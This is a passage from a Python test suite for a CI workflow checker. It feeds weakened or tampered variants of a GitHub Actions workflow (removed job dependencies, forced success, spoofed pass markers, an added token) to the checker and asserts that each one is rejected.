        for new in ("",                                                                                  # removed
                    self.PLAN_STEP.replace('[ "$SKIP" != true ] && [ "$DOCS_ONLY" != true ]', '[ "$SKIP" != true ] || [ "$DOCS_ONLY" != true ]'),
                    self.PLAN_STEP.replace('[ "$SKIP" != true ] && [ "$DOCS_ONLY" != true ]', '[ "$SKIP" != true ]'),
                    self.PLAN_STEP.replace('[ "$SKIP" != true ] && [ "$DOCS_ONLY" != true ]', 'true'),
                    self.PLAN_STEP.replace("RUN=true", "RUN=false"),
                    self.PLAN_STEP.replace("        id: plan\n", "        id: other\n"),
                    self.PLAN_STEP.replace("          SKIP: ${{ steps.skip.outputs.skip }}\n", ""),
                    self.PLAN_STEP.replace("DOCS_ONLY: ${{ steps.class.outputs.docs_only }}", "DOCS_ONLY: false"),
                    self.PLAN_STEP.replace("        id: plan\n", "        id: plan\n        if: ${{ false }}\n"),
                    self.PLAN_STEP.replace("        id: plan\n", "        id: plan\n        continue-on-error: true\n")):
            with self.subTest(new=new.strip()[:80]):
                self.change("symbolic-check.yml", self.PLAN_STEP, new)
                self.assertTrue(self.check(1).stderr)
                self.tearDown()
                self.setUp()

    AGG_STEP_START = "      - name: Require every job\n"

    def agg_step(self):
        text = self.job_text("check-hosted")
        return text[text.index(self.AGG_STEP_START):]

    def test_the_aggregating_job_is_pinned(self):
        agg = self.agg_step()
        gate = "    if: ${{ always() && (github.event_name == 'push'"
        for old, new in ((gate, "    if: ${{ (github.event_name == 'push'"),                                     # no always()
                         (gate, "    if: ${{ !cancelled() && (github.event_name == 'push'"),
                         ("    needs: [check-plan, check-root, check-consumers-db, check-consumers]\n", "    needs: [check-plan, check-root, check-consumers-db]\n"),
                         ("    needs: [check-plan, check-root, check-consumers-db, check-consumers]\n", "    needs: [check-root, check-consumers-db, check-consumers]\n"),
                         ("    needs: [check-plan, check-root, check-consumers-db, check-consumers]\n", "    needs: check-plan\n"),
                         ("          test \"$PLAN\" = success\n", ""),
                         ("            test \"$ROOT\" = success\n", ""),
                         ("            test \"$DB\" = success\n", ""),
                         ("            test \"$CONSUMERS\" = success\n", ""),
                         ("            test \"$ROOT\" = skipped\n", ""),
                         ("            test \"$DB\" = skipped\n", "            test \"$DB\" = success\n"),
                         ("            test \"$RUN\" = false\n", ""),
                         ("          if [ \"$RUN\" = true ]; then\n", "          if [ \"$RUN\" != false ]; then\n"),
                         ("            echo \"ELZOO CHECK PASSED\"\n", ""),
                         ("          CONSUMERS: ${{ needs.check-consumers.result }}\n", "          CONSUMERS: success\n"),
                         ("          ROOT: ${{ needs.check-root.result }}\n", "          ROOT: ${{ needs.check-plan.result }}\n"),
                         ("        run: |\n          echo \"plan=", "        continue-on-error: true\n        run: |\n          echo \"plan="),
                         ("        run: |\n          echo \"plan=", "        run: |\n          exit 0\n          echo \"plan="),
                         (agg, agg + "      - run: true\n"),                                                  # a third step
                         ("      - name: Require every job\n", "      - run: true\n      - name: Require every job\n")):
            with self.subTest(new=new.strip()[:70], old=old.strip()[:40]):
                self.change_in_job("symbolic-check.yml", "check-hosted", old, new)
                self.assertTrue(self.check(1).stderr)
                self.tearDown()
                self.setUp()

    def test_the_full_check_marker_is_printed_by_the_aggregating_job_only(self):
        self.assertEqual(1, self.source().count("ELZOO CHECK PASSED"))
        for job in ("check-plan", "check-root", "check-consumers-db", "check-consumers"):
            with self.subTest(job=job):
                self.change_in_job("symbolic-check.yml", job, "      - name: Verify the GitHub-hosted runner\n",
                                   "      - run: echo \"ELZOO CHECK PASSED\"\n      - name: Verify the GitHub-hosted runner\n")
                self.assertTrue(self.check(1).stderr)
                self.tearDown()
                self.setUp()
        self.change_in_job("symbolic-check.yml", "check-hosted", "            echo \"ELZOO CHECK PASSED\"\n",
                           "            echo \"ELZOO CHECK PASSED\"\n            echo \"ELZOO CHECK PASSED\"\n")
        self.assertIn("the full-check marker may be printed by the pinned aggregating step only (check-hosted)", self.check(1).stderr)

    def test_the_docs_only_marker_is_printed_by_the_plan_job_only(self):
        for job in ("check-root", "check-consumers-db", "check-consumers", "check-hosted"):
            with self.subTest(job=job):
                self.change_in_job("symbolic-check.yml", job, "      - name: Verify the GitHub-hosted runner\n",
                                   "      - run: echo \"ELZOO DOCS-ONLY CHECK PASSED\"\n      - name: Verify the GitHub-hosted runner\n")
                self.assertIn(f"the docs-only marker may be printed by the pinned Docs-only check step only ({job})", self.check(1).stderr)
                self.tearDown()
                self.setUp()

    def test_the_aggregating_job_has_no_database_cache_or_token(self):
        for old, new in (("    timeout-minutes: 10\n    steps:\n", "    timeout-minutes: 10\n    services:\n      postgres:\n        image: x\n    steps:\n"),
                         ("    steps:\n", "    env:\n      T: ${{ github.token }}\n    steps:\n")):
            with self.subTest(new=new.strip()[:40]):
                self.change_in_job("symbolic-check.yml", "check-hosted", old, new)
                self.assertTrue(self.check(1).stderr)
                self.tearDown()
                self.setUp()

    def test_the_skip_decision_step_does_not_wait_for_the_classification(self):
        # The decision step must keep running on every event (it prints the skip verdict of a push run).
        decision = "      - name: Decide whether the full check is redundant\n        id: skip\n"
        self.change("symbolic-check.yml", decision, decision + self.SKIP_IF)
        self.assertTrue(self.check(1).stderr)

    def test_pull_request_runs_use_the_full_check_not_the_affected_mode(self):
        source = self.source()
        self.assertNotIn("--affected", source)
        self.assertNotIn("ELZOO_CHECK_EVENT", source)
        self.assertNotIn("pull_request.base.sha", source)


if __name__ == "__main__":
    unittest.main()
